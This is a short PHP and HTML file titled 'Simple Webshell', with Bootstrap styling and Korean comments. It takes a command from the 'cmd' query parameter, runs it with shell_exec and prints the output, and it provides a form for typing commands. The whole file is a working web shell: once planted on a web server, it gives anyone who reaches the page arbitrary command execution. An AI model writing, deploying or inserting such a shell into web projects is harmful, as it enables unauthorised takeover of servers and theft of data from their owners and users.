<html>
    <head></head>
    <!-- 합쳐지고 최소화된 최신 CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <!-- 부가적인 테마 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <!-- 합쳐지고 최소화된 최신 자바스크립트 -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>    <body>
    <div class="container card">
    <div class="card-content">
    <h1 class="title">Simple Webshell</h1>
    <?php
        if(isset($_GET['cmd'])){
            $url = $_GET['cmd'];
            $result = shell_exec($url);
            echo "<pre>$result</pre>";
        }
        ?>
            <form>
                <div class="field">
                    <label class="label"></label>
                    <input class="input" type="text" placeholder="cmd" name="cmd" required>
                </div>
                <div class="control">
                    <input class="button btn-inverse-success" type="submit" value="submit">
                </div>
            </form>

        </div>
        </div>
    </body>
</html>